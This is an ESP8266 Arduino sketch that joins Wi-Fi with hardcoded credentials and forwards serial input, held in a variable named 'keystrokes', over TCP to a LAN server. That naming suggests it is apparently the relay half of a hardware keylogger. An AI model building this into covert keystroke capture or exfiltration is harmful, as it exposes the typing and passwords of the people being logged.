#include <ESP8266WiFi.h>
#include <WiFiClient.h>

const char *ssid = "galsiphone";      // replace with your actual SSID
const char *password = "12341234";    // replace with your actual password
const uint16_t port = 10319;
const char *host = "172.20.10.5";     // replace with your server IP

WiFiClient client;
bool connected = false;

void setup() {
    delay(10000);
    Serial.begin(115200);
    Serial.println();
    Serial.println("Connecting to WiFi...");

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, password);

    int retries = 0;
    while (WiFi.status() != WL_CONNECTED && retries < 20) {
        delay(500);
        Serial.print(".");
        retries++;
    }

    if (WiFi.status() == WL_CONNECTED) {
        Serial.println();
        Serial.print("Connected to WiFi. IP address: ");
        Serial.println(WiFi.localIP());
    } else {
        Serial.println();
        Serial.println("Failed to connect to WiFi.");
    }
}

void loop() {
    if (!connected) {
        if (WiFi.status() != WL_CONNECTED) {
            Serial.println("WiFi not connected!");
            delay(1000);
            return;
        }

        Serial.println("Attempting to connect to server...");
        if (!client.connect(host, port)) {
            Serial.println("Connection to host failed");
            delay(1000);
            return;
        }
        Serial.println("Connected to server successfully!");
        connected = true;
    }
    if (Serial.available()) {
        String keystrokes = Serial.readString();
        client.print(keystrokes);
        Serial.print("Sent to server: ");
        Serial.println(keystrokes);
    }
    
    delay(5000);
}
